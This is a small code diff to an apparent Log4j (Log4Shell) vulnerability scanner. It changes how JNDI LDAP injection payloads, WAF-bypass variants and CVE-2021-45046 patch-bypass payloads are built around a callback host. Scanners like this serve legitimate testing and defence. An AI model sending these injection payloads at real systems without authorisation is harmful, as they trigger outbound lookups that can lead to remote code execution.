@@ -315,11 +315,11 @@ def scan_url(url, callback_host, proxies, args):
     payload = '${jndi:ldap://%s/%s}' % (host_def, random_string)
     payloads = [payload]
     if args.waf_bypass_payloads:
-        payloads.extend(generate_waf_bypass_payloads(f'{parsed_url["host"]}.{callback_host}', random_string))
+        payloads.extend(generate_waf_bypass_payloads(host_def, random_string))
 
     if args.cve_2021_45046:
         cprint(f"[•] Scanning for CVE-2021-45046 (Log4j v2.15.0 Patch Bypass - RCE)", "yellow")
-        payloads = get_cve_2021_45046_payloads(f'{parsed_url["host"]}.{callback_host}', random_string)
+        payloads = get_cve_2021_45046_payloads(host_def, random_string)
 
     auth = None
     if args.basic_auth_user:
@@ -386,7 +386,7 @@ def main(options):
     if args.proxy:
         proxies = {"http": args.proxy, "https": args.proxy}
     
-    if args.custom_waf_bypass_payload:
+    if args.custom_waf_bypass_payload and args.custom_waf_bypass_payload not in waf_bypass_payloads:
         waf_bypass_payloads.append(args.custom_waf_bypass_payload)
     
     urls = []
